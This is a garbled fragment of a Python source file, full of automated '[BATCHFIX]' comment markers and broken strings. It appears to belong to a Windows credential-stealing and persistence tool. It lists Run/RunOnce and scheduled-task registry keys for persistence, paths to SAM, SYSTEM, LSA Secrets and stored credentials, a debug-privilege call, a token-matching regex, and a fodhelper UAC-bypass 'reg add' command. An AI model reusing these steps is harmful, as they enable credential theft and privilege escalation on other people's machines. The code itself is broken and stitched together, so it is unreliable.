...
#             "drivers": "SELECT device_name, image FROM drivers WHERE image != ";","  # [BATCHFIX] closed string
...
#             "process_connections": (
# [BATCHFIX] Commented metadata/non-Python
"""                 "SELECT p.name, p.path, pos.local_address, pos.remote_address"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
""""Registry keys and paths commonly used for persistence."""
        return [
# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rHKCU\Software\Microsoft\Windows\CurrentVersion\Run","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rHKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string
#             "task_cache_path": rHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string
#             "task_tree_path": rHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree","  # [BATCHFIX] closed string
...
""""Files and registry keys for hijacking user sessions"."""
        return [
# [BATCHFIX] Commented metadata/non-Python
#             rC:\Windows\System32\\\\config\SAM","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rC:\Windows\System32\\\\config\SYSTEM","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rHKLM\SECURITY\Policy\Secrets","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rC:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#             rC:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\\\\machine.config","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
# [BATCHFIX] Commented metadata/non-Python
"""                 "ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()));"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
# [BATCHFIX] Commented metadata/non-Python
"""                 "[Environment]::UserName,[Environment]::UserDomainName);"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string
#                 "token_regex": [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", rmfa\.[\w-]{84}"],"  # [BATCHFIX] closed string
...
# [BATCHFIX] Commented metadata/non-Python
#             rreg add hkcu\Software\Classes\\\\ms-settings\\\\shell\open\\\\command /v DelegateExecute /f","  # [BATCHFIX] closed string
            "fodhelper.exe",
